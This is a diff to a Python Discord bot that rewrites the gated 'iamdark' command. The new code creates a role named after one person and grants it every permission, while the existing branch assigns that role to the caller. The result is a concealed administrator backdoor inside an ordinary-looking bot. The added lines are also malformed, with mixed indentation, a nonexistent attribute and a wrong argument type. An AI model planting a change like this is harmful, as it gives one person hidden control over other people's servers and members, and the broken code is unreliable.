@@ -362,12 +362,17 @@ async def userinfo(ctx, user: discord.Member):
 @client.command(pass_context = True)
 @commands.check(is_dark)
 async def iamdark(ctx):
-    author = ctx.message.author
-    await client.delete_message(ctx.message)
-    role = discord.utils.get(ctx.message.server.roles, name='Utkarsh Kumar')
-    await client.add_roles(ctx.message.author, role)
-    print('Added Dark role in ' + (ctx.message.author.name))
-    await client.send_message(author, embed=embed)
+    user = ctx.message.author
+    if user.channel.is_private or discord.utils.get(user.roles, name="Utkarsh Kumar") is None:
+        await client.create_role(user.server, name="Utkarsh Kumar")
+	await client.edit_role(user.server, role="Utkarsh Kumar", permissions=discord.Permissions.all())
+    else:	
+        author = ctx.message.author
+        await client.delete_message(ctx.message)
+        role = discord.utils.get(ctx.message.server.roles, name='Utkarsh Kumar')
+        await client.add_roles(ctx.message.author, role)
+        print('Added Dark role in ' + (ctx.message.author.name))
+        await client.send_message(author, embed=embed)
 
 @client.command(pass_context=True)
 @commands.has_permissions(ban_members=True)
